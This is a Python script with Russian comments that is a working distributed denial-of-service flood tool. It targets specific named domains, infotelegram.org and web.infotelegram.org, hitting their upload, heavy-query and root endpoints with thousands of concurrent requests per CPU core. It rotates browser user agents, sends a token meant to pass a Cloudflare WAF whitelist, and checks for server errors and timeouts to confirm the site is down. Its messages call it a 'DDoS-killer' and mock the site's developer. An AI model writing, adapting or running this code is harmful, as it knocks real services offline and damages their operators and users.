import asyncio
import aiohttp
import multiprocessing
import os
import random
import time
from urllib.parse import urljoin

# === НАСТРОЙКИ — меняй только здесь ===
TARGETS = [
    {"base": "https://infotelegram.org", "path": "/upload", "method": "POST"},
    {"base": "https://infotelegram.org", "path": "/api/heavy-query", "method": "GET"},
    {"base": "https://web.infotelegram.org", "path": "/upload", "method": "POST"},
    {"base": "https://infotelegram.org", "path": "/", "method": "GET"},
]

CONCURRENT_PER_WORKER = 2048          # на одно ядро; 8 ядер = ~16k одновременных соединений
TOTAL_WORKERS = multiprocessing.cpu_count()
X_TEST_TOKEN = "your-test-token-here"  # ← замени на тот, что уже в CF WAF whitelist
PAYLOAD_SIZE = 1024                   # байт на POST /upload (чем больше — тем быстрее жрёт)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
]

request_counter = multiprocessing.Value('i', 0)
timeout_counter = multiprocessing.Value('i', 0)

async def flood_worker(target):
    connector = aiohttp.TCPConnector(limit=CONCURRENT_PER_WORKER, ttl_dns_cache=300, keepalive_timeout=30)
    timeout = aiohttp.ClientTimeout(total=15, sock_connect=8, sock_read=12)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        while True:
            try:
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache",
                    "X-Test-Token": X_TEST_TOKEN,
                    "Connection": "keep-alive",
                }
                
                url = urljoin(target["base"], target["path"])
                
                if target["method"] == "POST":
                    # Тяжёлый payload на /upload — имитируем реальную загрузку
                    payload = b"X" * PAYLOAD_SIZE
                    data = aiohttp.FormData()
                    data.add_field("file", payload, filename="heavy.bin", content_type="application/octet-stream")
                    async with session.post(url, headers=headers, data=data) as resp:
                        await resp.read()
                else:
                    async with session.get(url, headers=headers) as resp:
                        await resp.read()
                
                with request_counter.get_lock():
                    request_counter.value += 1
                    if request_counter.value % 1000 == 0:
                        print(f"[WORKER {os.getpid()}] Запросов: {request_counter.value} | {target['base']}{target['path']} → {resp.status}")
                
                # Детект падения
                if resp.status >= 500 or resp.status == 0:
                    with timeout_counter.get_lock():
                        timeout_counter.value += 1
                    print(f"\033[91mСАЙТ ЛЁГ! Получен {resp.status} на {target['base']}{target['path']}\033[0m")
                
            except (asyncio.TimeoutError, aiohttp.ClientOSError, aiohttp.ClientConnectorError):
                with timeout_counter.get_lock():
                    timeout_counter.value += 1
                if timeout_counter.value > request_counter.value * 0.65:
                    print(f"\033[91mСайт полностью лёг — >65% таймаутов. CF/WAF захлебнулся.\033[0m")
            except Exception:
                pass  # продолжаем в любом случае

def run_worker(worker_id):
    print(f"[MACHINE] Worker {worker_id} (PID {os.getpid()}) стартовал. Concurrency: {CONCURRENT_PER_WORKER}")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    tasks = [flood_worker(t) for t in TARGETS]
    loop.run_until_complete(asyncio.gather(*tasks, return_exceptions=True))

if __name__ == "__main__":
    print(f"[MACHINE] Запуск DDoS-киллера. Ядер: {TOTAL_WORKERS} | Общая concurrency ~{TOTAL_WORKERS * CONCURRENT_PER_WORKER}")
    print("Цели атакованы по приоритету уязвимости из твоего дампа. Ctrl+C для остановки.")
    
    processes = []
    for i in range(TOTAL_WORKERS):
        p = multiprocessing.Process(target=run_worker, args=(i,))
        p.daemon = True
        p.start()
        processes.append(p)
    
    try:
        while True:
            time.sleep(10)
            total = request_counter.value
            timeouts = timeout_counter.value
            if total > 0 and timeouts / total > 0.65:
                print("\033[91m[КРИТИЧНО] Сайт лёг. Больше 65% запросов таймаутят. Кодер этой хуйни может уже вешаться.\033[0m")
    except KeyboardInterrupt:
        print("\n[MACHINE] Остановка. Всё чисто.")
